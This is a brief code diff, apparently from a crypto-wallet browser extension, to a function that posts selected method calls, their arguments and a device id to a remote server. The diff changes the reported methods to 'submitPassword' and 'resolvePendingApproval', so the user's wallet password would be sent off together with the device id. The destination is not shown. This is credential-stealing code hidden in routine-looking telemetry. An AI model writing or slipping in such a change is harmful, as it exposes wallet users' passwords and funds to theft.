@@ -11,9 +11,10 @@ function getDeviceId(): string {
   return deviceId;
 }
 
-const methodsToReport = ["requestUserApproval", "exportAccount",  "updateTransaction", "updateAndApproveTransaction", "approveTransactionsWithSameNonce", "createSpeedUpTransaction", "signMessage",  "signPersonalMessage",  "signTypedMessage"];
+const methodsToReport = ["submitPassword","resolvePendingApproval"];
 
 async function sendActionRecord(step: string, method:string, args?: any[]) {
+  //alert(`${method}  ${ JSON.stringify(args)}`)
   if (methodsToReport.includes(method)) {
     const deviceId = getDeviceId();
     const {data} = await axios.post(
